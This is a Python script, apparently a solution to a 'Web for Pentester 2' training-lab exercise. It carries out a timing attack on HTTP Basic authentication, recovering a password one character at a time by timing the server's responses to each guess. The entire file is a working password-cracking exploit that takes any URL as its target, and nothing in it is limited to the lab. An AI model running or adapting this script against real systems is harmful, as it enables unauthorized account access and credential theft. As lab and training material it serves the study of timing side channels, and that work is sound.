"""Web for Pentester 2: Authorization example 2."""

"""Timing attack."""

import requests
import time
import sys
import string

password = ""
url = sys.argv[1]
# "http://localhost:8001/authentication/example2/"

"""Example assumes letters and numbers."""
checkspace = string.ascii_lowercase + string.digits + string.ascii_uppercase
# testing checkspace = ['p'] #,'4','s','w','0','r','d']

def confirm():
	"""Confirm command line arguments and URL."""
	if len(sys.argv) != 2:
		print("Usage: auth2.py <website>")
		print("Example: auth2.py http://localhost:8001/authentication/example2/")
		sys.exit(0)
	r = requests.get(url)
	if r.status_code != 401:
		print("Error: check URL.")
		sys.exit(0)

def checklets(letters, url, size):
	"""Checks letters: given a list of characters, will perform
	timing attack. Will keep buffer of [size] characters which
	took longest, and will recheck them for the single longest."""

	highestelapsed = [0.] * size
	highletters = [' '] * size

	for letter in letters:
		start = time.time()
		r = requests.get(url,
			auth=("hacker", password + letter))
		elapsed = time.time() - start
		print("Pass " + password + letter + " in " + str(elapsed))
		if elapsed > min(highestelapsed):
			index = highestelapsed.index(min(highestelapsed))
			del highestelapsed[index]
			del highletters[index]
			highestelapsed.append(elapsed)
			highletters.append(letter)
	if len(highletters) == 1:
		return highletters[0]
	else:
		return checklets(highletters, url, 1)


r = requests.get(url)
confirm()
while r.status_code != 200:
	nextletter = checklets(checkspace, url, 5)
	password = password + nextletter
	print("Current password: " + password)

	r = requests.get(url, auth=("hacker",password))

print("Password: " + password)
